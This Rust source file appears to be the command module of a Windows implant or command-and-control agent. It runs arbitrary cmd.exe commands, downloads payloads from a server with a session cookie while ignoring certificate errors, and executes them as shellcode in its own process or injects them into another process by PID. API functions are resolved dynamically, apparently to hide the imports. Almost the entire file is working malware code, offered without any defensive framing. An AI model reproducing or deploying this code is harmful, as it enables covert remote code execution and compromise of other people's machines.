pub mod command {
    use std::ffi::c_void;
    use std::ptr::{null, null_mut};

    use crate::obfwin::obfwin::*;

    fn get_file_vec(
        base_url: &str,
        file_name: &str,
        cookie_header: &reqwest::header::HeaderValue,
    ) -> Vec<u8> {
        // First need to get the file from the server
        let file_url = base_url.to_owned() + "/recipes/download/" + file_name;

        let client = reqwest::blocking::ClientBuilder::new()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();

        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(reqwest::header::COOKIE, cookie_header.clone());

        let file_response = client
            .get(file_url)
            .headers(headers.clone())
            .send()
            .unwrap();

        let file_vec: Vec<u8> = file_response.bytes().unwrap().into();
        return file_vec;
    }

    pub fn shell(shell_str: &str) -> String {
        let output = std::process::Command::new("cmd.exe")
            .arg("/c")
            .arg(shell_str.to_owned() + " 2>&1")
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::inherit())
            .output()
            .expect("Failed to execute command");

        String::from_utf8_lossy(&output.stdout).to_string()
    }
    pub fn shellcode_spawn(
        base_url: &str,
        cookie_header: &reqwest::header::HeaderValue,
        file_name: &str,
        memory_permissions: &str,
    ) -> String {
        // Get the file off the server
        let file_vec = get_file_vec(base_url, file_name, cookie_header);

        let file_bytes: &[u8] = &file_vec;
        let file_size = file_bytes.len();

        unsafe {
            // Old perms required for VirtualProtect
            let mut old_perms = PAGE_READWRITE;
            // Get the kernel32 library
            let kernel32 = libloading::Library::new("kernel32.dll").unwrap();
            // Get ntdll library
            let ntdll = libloading::Library::new("ntdll.dll").unwrap();
            // Get VirtualAlloc() out of kernel32
            let virtual_alloc: libloading::Symbol<
                unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
            > = kernel32.get(b"VirtualAlloc\0").unwrap();
            // Get the RtlMoveMemory() out of ntdll
            let rtl_move_memory: libloading::Symbol<
                unsafe extern "C" fn(*mut c_void, *const c_void, usize),
            > = ntdll.get(b"RtlMoveMemory\0").unwrap();
            // Get VirtualProtect() out of kernel32
            let virtual_protect: libloading::Symbol<
                unsafe extern "C" fn(*const c_void, usize, u32, u32) -> u32,
            > = kernel32.get(b"VirtualProtect\0").unwrap();
            // Get CreateThread() out of kernel32
            let create_thread: libloading::Symbol<
                unsafe extern "C" fn(
                    *const c_void,
                    usize,
                    *const c_void,
                    *const c_void,
                    u32,
                    *mut u32,
                ) -> isize,
            > = kernel32.get(b"CreateThread\0").unwrap();

            // If specified to use RW memory, allocate, copy, change to RX, execute
            if memory_permissions == "RW" {
                // Allocate some RW
                let dest =
                    virtual_alloc(null(), file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                // Copy the shellcode in there
                rtl_move_memory(dest, file_bytes.as_ptr().cast(), file_size);
                // Re-protect as exec-read
                virtual_protect(dest, file_size, PAGE_EXECUTE_READ, old_perms);
                // Run the shellcode
                let handle = create_thread(null(), 0, dest, null(), 0, null_mut());
            } else {
                // RWX by default, allocate, copy, execute
                // Allocate some RWX
                let dest = virtual_alloc(
                    null(),
                    file_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                // Copy the shellcode in there
                rtl_move_memory(dest, file_bytes.as_ptr().cast(), file_size);
                // Run the shellcode
                let handle = create_thread(null(), 0, dest, null(), 0, null_mut());
            }
        }
        "Shellcode successfully executed".to_string()
    }
    pub fn shellcode_inject(
        base_url: &str,
        cookie_header: &reqwest::header::HeaderValue,
        file_name: &str,
        target_pid: u32,
        memory_permissions: &str,
    ) -> String {
        // Get the file off the server
        let file_vec = get_file_vec(base_url, file_name, cookie_header);

        let file_bytes: &[u8] = &file_vec;
        let file_size = file_bytes.len();

        unsafe {
            // Old perms required for VirtualProtect
            let mut old_perms = PAGE_READWRITE;
            // Get the kernel32 library
            let kernel32 = libloading::Library::new("kernel32.dll").unwrap();
            // Get ntdll library
            let ntdll = libloading::Library::new("ntdll.dll").unwrap();

            // Get OpenProcess() out of kernel32
            let open_process: libloading::Symbol<unsafe extern "C" fn(u32, i32, u32) -> isize> =
                kernel32.get(b"OpenProcess\0").unwrap();

            // Get VirtualAlloc() out of kernel32
            let virtual_alloc_ex: libloading::Symbol<
                unsafe extern "C" fn(isize, *const c_void, usize, u32, u32) -> *mut c_void,
            > = kernel32.get(b"VirtualAllocEx\0").unwrap();

            // Get WriteProcessMemory out of kernel32
            let write_process_memory: libloading::Symbol<
                unsafe extern "C" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32,
            > = kernel32.get(b"WriteProcessMemory\0").unwrap();

            // Get VirtualProtectEx() out of kernel32
            let virtual_protect_ex: libloading::Symbol<
                unsafe extern "C" fn(isize, *const c_void, usize, u32, *mut u32) -> i32,
            > = kernel32.get(b"VirtualProtectEx\0").unwrap();

            // Get CreateRemoteThread() out of kernel32
            let create_remote_thread: libloading::Symbol<
                unsafe extern "C" fn(
                    isize,
                    *const c_void,
                    usize,
                    *const c_void,
                    *const c_void,
                    usize,
                    *mut c_void,
                ) -> isize,
            > = kernel32.get(b"CreateRemoteThread\0").unwrap();
            
            // Get CloseHandle out of kernel32
            let close_handle: libloading::Symbol<unsafe extern "C" fn(isize) -> u32> =
                kernel32.get(b"CloseHandle\0")
                .unwrap();

            // Get a handle on the target process
            let handle = open_process(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                FALSE,
                target_pid,
            );

            // If specified to use RW memory, allocate, copy, change to RX, execute
            if memory_permissions == "RW" {
                let mut old_perm = PAGE_READWRITE;

                // Allocate inside of the target pid process
                let dest = virtual_alloc_ex(handle, null(), file_size, MEM_COMMIT, PAGE_READWRITE);
                // Write memory inside of targed pid
                write_process_memory(
                    handle,
                    dest,
                    file_bytes.as_ptr().cast(),
                    file_size,
                    null_mut(),
                );
                // Re-protect it as PAGE_EXECUTE_READ
                virtual_protect_ex(handle, dest, file_size, PAGE_EXECUTE_READ, &mut old_perm);
                // Spawn the thread
                create_remote_thread(handle, null(), 0, dest, null(), 0, null_mut());
            } else {
                // Allocate inside of the target pid process
                let dest = virtual_alloc_ex(
                    handle,
                    null(),
                    file_size,
                    MEM_COMMIT,
                    PAGE_EXECUTE_READWRITE,
                );
                // Write memory inside of targed pid
                write_process_memory(
                    handle,
                    dest,
                    file_bytes.as_ptr().cast(),
                    file_size,
                    null_mut(),
                );
                // Spawn the thread
                create_remote_thread(handle, null(), 0, dest, null(), 0, null_mut());
            }

            close_handle(handle);
        }
        "Shellcode successfully executed".to_string()
    }
}
